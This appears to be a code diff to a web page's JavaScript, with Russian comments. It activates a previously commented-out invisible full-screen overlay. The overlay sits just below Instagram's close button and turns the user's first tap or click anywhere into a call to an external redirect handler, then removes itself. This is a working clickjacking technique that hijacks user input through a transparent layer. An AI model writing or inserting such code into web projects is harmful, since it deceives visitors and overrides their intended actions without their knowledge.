@@ -88,20 +88,20 @@ document.addEventListener('DOMContentLoaded', function () {
 
     // Создаем невидимый шар.
     // ВНИМАНИЕ: top: 60px оставляет место для системной кнопки "Закрыть" (X) в Instagram
-    // const fullPageTrigger = document.createElement("div");
-    // fullPageTrigger.id = "invisible-redirect-trigger";
-    // fullPageTrigger.style.cssText = "position:fixed; top:60px; left:0; width:100%; height:calc(100% - 60px); z-index:999999; background:transparent;";
-    // document.body.appendChild(fullPageTrigger);
-    //
-    // const triggerAction = () => {
-    //     handleExternalRedirect();
-    //
-    //     // Удаляем слой МГНОВЕННО, чтобы не блокировать интерфейс после клика
-    //     if (fullPageTrigger.parentNode) {
-    //         document.body.removeChild(fullPageTrigger);
-    //     }
-    // };
-    //
-    // fullPageTrigger.addEventListener('touchstart', triggerAction, {once: true});
-    // fullPageTrigger.addEventListener('click', triggerAction, {once: true});
+    const fullPageTrigger = document.createElement("div");
+    fullPageTrigger.id = "invisible-redirect-trigger";
+    fullPageTrigger.style.cssText = "position:fixed; top:60px; left:0; width:100%; height:calc(100% - 60px); z-index:999999; background:transparent;";
+    document.body.appendChild(fullPageTrigger);
+
+    const triggerAction = () => {
+        handleExternalRedirect();
+
+        // Удаляем слой МГНОВЕННО, чтобы не блокировать интерфейс после клика
+        if (fullPageTrigger.parentNode) {
+            document.body.removeChild(fullPageTrigger);
+        }
+    };
+
+    fullPageTrigger.addEventListener('touchstart', triggerAction, {once: true});
+    fullPageTrigger.addEventListener('click', triggerAction, {once: true});
 });
